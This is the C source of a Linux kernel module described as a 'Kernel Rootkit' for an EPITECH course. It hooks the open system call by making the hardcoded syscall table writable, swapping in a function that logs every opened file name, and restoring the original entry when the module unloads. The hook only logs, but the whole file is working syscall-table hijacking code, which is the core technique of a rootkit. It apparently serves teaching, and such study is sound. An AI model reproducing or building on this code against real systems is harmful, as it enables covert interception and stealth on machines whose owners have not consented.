#include <linux/module.h>
#include <linux/highmem.h>
#include <asm/unistd.h>

#define ROOTKIT_SYSCALL_TABLE_ADDR (0xffffffff81800180)

unsigned long *sys_call_table = (void *)ROOTKIT_SYSCALL_TABLE_ADDR;

asmlinkage int (*real_open)(const char __user *, int, int);

asmlinkage int rootkit_open(const char __user *file_name, int flags, int mode)
{
	pr_info("open(\"%s\", %X, %X)\n", file_name, flags, mode);
	return real_open(file_name, flags, mode);
}

static void rootkit_set_table_rw(void)
{
	unsigned int lvel;
	pte_t *p = lookup_address((unsigned long)sys_call_table, &lvel);

	if (p->pte & ~_PAGE_RW)
		p->pte |= _PAGE_RW;
}

static void rootkit_set_table_ro(void)
{
	unsigned int lvel;
	pte_t *p = lookup_address((unsigned long)sys_call_table, &lvel);

	p->pte = p->pte & ~_PAGE_RW;
}

static int __init rootkit_init(void)
{
	rootkit_set_table_rw();
	real_open = (void *)(sys_call_table[__NR_open]);
	sys_call_table[__NR_open] = (unsigned long)rootkit_open;
	rootkit_set_table_ro();
	return 0;
}

static void __exit rootkit_exit(void)
{
	rootkit_set_table_rw();
	sys_call_table[__NR_open] = (unsigned long)real_open;
	rootkit_set_table_ro();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guillaume Rybak");
MODULE_DESCRIPTION("EPITECH --- Kernel Rootkit");
